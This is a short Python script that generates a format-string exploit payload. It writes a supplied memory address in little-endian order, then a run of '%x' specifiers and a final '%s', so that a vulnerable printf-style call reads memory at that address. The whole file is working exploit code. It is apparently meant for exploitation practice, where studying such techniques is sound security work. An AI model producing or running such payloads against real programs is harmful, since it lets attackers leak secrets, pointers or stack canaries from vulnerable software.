#!/usr/bin/env python3

import sys

def help():
    print("Usage: ./{} {{memory address}} {{offset}}".format(sys.argv[0]))
    print("Address and value format: 0xXXXXXXXX")
    print("Offset - number of octets from $esp to start of buffer")
    exit(1)

def get_address(address):
    return address.to_bytes(4, 'little')

if len(sys.argv) < 3:
    help()

address = int(sys.argv[1], 16)
offset = int(sys.argv[2])

sys.stdout.buffer.write(get_address(address))

output = ''.join(['%x' for i in range(offset)])
output += 'Data: %s'

print(output, end='')
